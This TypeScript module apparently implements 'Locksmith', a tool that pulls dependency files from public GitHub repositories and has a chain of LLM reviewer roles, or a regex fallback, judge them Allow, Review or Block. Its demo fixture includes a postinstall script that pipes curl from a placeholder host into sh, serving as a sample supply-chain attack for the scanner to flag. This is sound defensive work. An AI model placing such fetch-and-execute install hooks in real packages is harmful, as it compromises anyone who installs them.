import { createHash } from "node:crypto";

export const ROLES = ["Baseline", "Manifest", "Static", "Behavior", "Skeptic", "Judge"] as const;
export type Role = (typeof ROLES)[number];
export type Verdict = "Allow" | "Review" | "Block";

export type Finding = {
  role: Role;
  verdict: Verdict;
  summary: string;
  evidence: string[];
  confidence: number;
};

export type ReviewInput = { repoUrl?: string; branch?: string; files?: Record<string, string>; policy?: string };
export type RepoInspection = { repoUrl: string; defaultBranch: string; branches: string[]; dependencyFiles: string[] };

export const DEPENDENCY_FILES = ["package.json", "package-lock.json", "pnpm-lock.yaml", "yarn.lock", "requirements.txt", "pyproject.toml"] as const;

const demoFiles = {
  "package.json": JSON.stringify({ name: "locksmith-demo", dependencies: { "safe-logger": "1.0.0", "postinstall-helper": "2.1.0" }, scripts: { postinstall: "node scripts/install.js" } }, null, 2),
  "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/postinstall-helper": { version: "2.1.0", hasInstallScript: true } } }, null, 2),
  "scripts/install.js": "const {exec}=require('child_process'); exec('curl https://example.invalid/install | sh')",
};

function githubCoordinates(url: string) {
  const match = /^https?:\/\/(?:www\.)?github\.com\/([^/]+)\/([^/#]+?)(?:\.git)?(?:[\/#].*)?$/.exec(url);
  return match ? { owner: match[1], repo: match[2] } : null;
}

async function githubJson<T>(path: string): Promise<T> {
  const response = await fetch(`https://api.github.com${path}`, {
    headers: { Accept: "application/vnd.github+json", "User-Agent": "locksmith-demo" },
    signal: AbortSignal.timeout(8_000),
  });
  if (response.status === 404) throw new Error("Repository is private, missing, or not accessible without GitHub auth");
  if (!response.ok) throw new Error(`GitHub lookup failed (${response.status})`);
  return await response.json() as T;
}

export async function inspectGitHubRepo(repoUrl: string): Promise<RepoInspection> {
  const coordinates = githubCoordinates(repoUrl);
  if (!coordinates) throw new Error("Enter a GitHub repository URL like https://github.com/owner/repo");
  const repo = await githubJson<{ default_branch: string; private: boolean }>(`/repos/${coordinates.owner}/${coordinates.repo}`);
  if (repo.private) throw new Error("This repository is private. Locksmith cannot access it without GitHub auth.");
  const branches = await githubJson<{ name: string }[]>(`/repos/${coordinates.owner}/${coordinates.repo}/branches?per_page=20`);
  const tree = await githubJson<{ tree?: { path: string; type: string }[] }>(`/repos/${coordinates.owner}/${coordinates.repo}/git/trees/${encodeURIComponent(repo.default_branch)}?recursive=1`);
  const names = new Set(tree.tree?.filter(item => item.type === "blob").map(item => item.path));
  const dependencyFiles = DEPENDENCY_FILES.filter(name => names.has(name));
  return { repoUrl, defaultBranch: repo.default_branch, branches: Array.from(new Set([repo.default_branch, ...branches.map(branch => branch.name)])), dependencyFiles };
}

export async function gatherEvidence(input: ReviewInput) {
  if (input.files && Object.keys(input.files).length) return { source: "submitted-files", files: input.files };
  if (!input.repoUrl) return { source: "demo", files: demoFiles };
  const coordinates = githubCoordinates(input.repoUrl);
  if (!coordinates) throw new Error("repoUrl must be a public GitHub repository URL");
  const wanted = DEPENDENCY_FILES;
  const files: Record<string, string> = {};
  await Promise.all(wanted.map(async name => {
    const branch = encodeURIComponent(input.branch || "HEAD");
    const url = `https://raw.githubusercontent.com/${coordinates.owner}/${coordinates.repo}/${branch}/${name}`;
    const response = await fetch(url, { signal: AbortSignal.timeout(8_000) });
    if (response.ok) files[name] = (await response.text()).slice(0, 100_000);
  }));
  if (!Object.keys(files).length) throw new Error("No supported dependency files found in the public repository");
  return { source: `${input.repoUrl}#${input.branch || "HEAD"}`, files };
}

export function dependencyStateId(source: string, files: Record<string, string>) {
  const hash = createHash("sha256");
  hash.update(source);
  for (const name of Object.keys(files).sort()) hash.update(`\n${name}\0${files[name]}`);
  return `state_${hash.digest("hex").slice(0, 24)}`;
}

const prompts: Record<Role, string> = {
  Baseline: "Identify dependency state, additions/updates, and graph impact. If no prior baseline exists, clearly say this is an initial baseline.",
  Manifest: "Inspect manifests for lifecycle scripts, odd package purpose, release/publisher signals visible in evidence, and dependency-count jumps. Do not invent registry facts.",
  Static: "Identify concrete suspicious source patterns: obfuscation, eval, env/file/network access, or child processes. Cite exact snippets or filenames.",
  Behavior: "Predict install/runtime behavior only from supplied evidence. Distinguish observed code from behavior requiring sandbox confirmation.",
  Skeptic: "Challenge previous findings and plausible false positives. Say which claims survive and why, using only supplied evidence.",
  Judge: "Resolve all findings under policy. Output Allow, Review, or Block and the smallest concrete remediation.",
};

function fallback(role: Role, files: Record<string, string>, previous: Finding[]): Finding {
  const joined = Object.entries(files).map(([n, v]) => `${n}\n${v}`).join("\n");
  const risky = /postinstall|child_process|curl\s|eval\s*\(/i.test(joined);
  const verdict: Verdict = role === "Judge" ? (risky ? "Block" : "Allow") : risky ? "Review" : "Allow";
  const summaries: Record<Role, string> = {
    Baseline: "Initial dependency baseline computed from submitted files.", Manifest: risky ? "Lifecycle or install-time signals require review." : "No suspicious manifest signal found.",
    Static: risky ? "Install code contains network or process-execution indicators." : "No high-risk static pattern found.", Behavior: risky ? "Install may launch a child process or make a network request; sandbox confirmation is advised." : "No risky behavior inferred.",
    Skeptic: risky ? "Legitimate installers may use network/process access, but the combined shell-download pattern remains unsupported." : "No concrete evidence justifies escalation.",
    Judge: risky ? "Block until the install script is removed or independently verified." : "Allow this exact dependency state.",
  };
  return { role, verdict, summary: summaries[role], evidence: risky ? ["Matched lifecycle/network/process indicator in submitted files", `${previous.length} earlier panel findings considered`] : ["No deterministic high-risk indicator matched"], confidence: 0.75 };
}

function validFinding(value: unknown, role: Role): Finding {
  if (!value || typeof value !== "object") throw new Error(`${role} returned invalid JSON`);
  const v = value as Record<string, unknown>;
  if (!(["Allow", "Review", "Block"] as unknown[]).includes(v.verdict) || typeof v.summary !== "string" || !Array.isArray(v.evidence)) throw new Error(`${role} returned an invalid finding`);
  return { role, verdict: v.verdict as Verdict, summary: v.summary.slice(0, 1000), evidence: v.evidence.filter(x => typeof x === "string").slice(0, 8) as string[], confidence: Math.max(0, Math.min(1, typeof v.confidence === "number" ? v.confidence : 0.5)) };
}

async function infer(role: Role, files: Record<string, string>, previous: Finding[], policy: string): Promise<Finding> {
  const key = process.env.QWEN_API_KEY;
  if (!key) return fallback(role, files, previous);
  const baseUrl = (process.env.QWEN_BASE_URL || "https://dashscope-intl.aliyuncs.com/compatible-mode/v1").replace(/\/$/, "");
  const response = await fetch(baseUrl.endsWith("/chat/completions") ? baseUrl : `${baseUrl}/chat/completions`, {
    method: "POST", headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" }, signal: AbortSignal.timeout(60_000),
    body: JSON.stringify({ model: process.env.QWEN_MODEL || "qwen-plus", temperature: 0.1, response_format: { type: "json_object" }, messages: [
      { role: "system", content: `You are the Locksmith ${role} Agent. ${prompts[role]} Return only JSON: {\"verdict\":\"Allow|Review|Block\",\"summary\":\"...\",\"evidence\":[\"...\"],\"confidence\":0.0}. Never invent evidence.` },
      { role: "user", content: JSON.stringify({ policy, files, previousFindings: previous }) },
    ] }),
  });
  if (!response.ok) throw new Error(`Qwen ${role} request failed (${response.status})`);
  const payload = await response.json() as { choices?: { message?: { content?: string } }[] };
  const content = payload.choices?.[0]?.message?.content;
  if (!content) throw new Error(`Qwen ${role} returned no content`);
  try { return validFinding(JSON.parse(content.replace(/^```(?:json)?\s*|\s*```$/g, "")), role); }
  catch (error) { if (error instanceof SyntaxError) throw new Error(`Qwen ${role} returned malformed JSON`); throw error; }
}

export async function reviewDependencies(input: ReviewInput) {
  const evidence = await gatherEvidence(input);
  const findings: Finding[] = [];
  for (const role of ROLES) findings.push(await infer(role, evidence.files, findings, input.policy || "strict"));
  const judge = findings.at(-1)!;
  return {
    dependencyStateId: dependencyStateId(evidence.source, evidence.files),
    source: evidence.source,
    mode: process.env.QWEN_API_KEY ? "qwen" : "mock",
    model: process.env.QWEN_API_KEY ? process.env.QWEN_MODEL || "qwen-plus" : "deterministic fallback",
    findings,
    verdict: judge.verdict,
    remediation: judge.summary,
  };
}
